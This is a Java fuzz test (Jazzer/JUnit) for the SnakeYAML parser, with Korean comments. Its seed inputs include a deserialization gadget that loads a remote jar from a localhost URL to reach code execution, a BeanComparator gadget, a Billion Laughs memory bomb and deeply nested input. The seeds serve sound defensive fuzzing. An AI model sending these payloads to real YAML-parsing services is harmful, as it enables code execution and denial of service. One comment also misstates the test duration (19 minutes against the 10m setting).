package com.example;

import com.code_intelligence.jazzer.junit.FuzzTest;
import com.code_intelligence.jazzer.mutation.annotation.NotNull;
import org.yaml.snakeyaml.Yaml;
import org.junit.jupiter.params.provider.Arguments;
import org.junit.jupiter.params.provider.MethodSource;

import java.util.stream.Stream;
import static org.junit.jupiter.params.provider.Arguments.arguments;

class SnakeYamlFuzzTest {

    // 시드를 생성하는 메서드
    static Stream<Arguments> fuzzYamlParser() {
        return Stream.of(
            // 1. 안전하지 않은 역직렬화 (RCE 타겟)
            // SnakeYAML이 임의의 클래스를 인스턴스화하도록 유도
            arguments("!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\"http://localhost/malicious.jar\"] ]] ]"),
            arguments("!!java.util.PriorityQueue\ncomparator: !!java.beans.BeanComparator { property: 'class' }\n"),

            // 2. 순환 참조
            arguments("&a [ *a ]"),

            // 3. Billion Laughs 공격 (메모리 고갈 DoS)
            // 파싱 시 객체가 기하급수적으로 늘어남
            arguments("a: &a [\"lol\",\"lol\",\"lol\",\"lol\",\"lol\"]\n" +
                      "b: &b [*a,*a,*a,*a,*a]\n" +
                      "c: &c [*b,*b,*b,*b,*b]\n" +
                      "d: &d [*c,*c,*c,*c,*c]"),

            // 4. 깊은 중첩 구조 (StackOverflowError 유도)
            arguments("[".repeat(5000) + "]".repeat(5000)),
            arguments("{a: ".repeat(5000) + "1" + "}".repeat(5000))
        );
    }

    @MethodSource // 이 클래스와 같은 이름의 스태틱 메서드의 반환값을 시드로 입력받음
    @FuzzTest(maxDuration = "10m") // Jazzer 그레이박스 퍼징 실행(최대 19분)
    void fuzzYamlParser(@NotNull String input) {
        try {
            Yaml yaml = new Yaml();
            Object parsed = yaml.load(input); 
            
            // JVM에 크래시를 유발하기 위해 SnakeYAML로 만든 객체에 대해 toString 호출
            if (parsed != null) {
                parsed.toString();
            }
            
        } catch (Exception e) {
            // 다른 예외는 모두 무시
        }
    }
}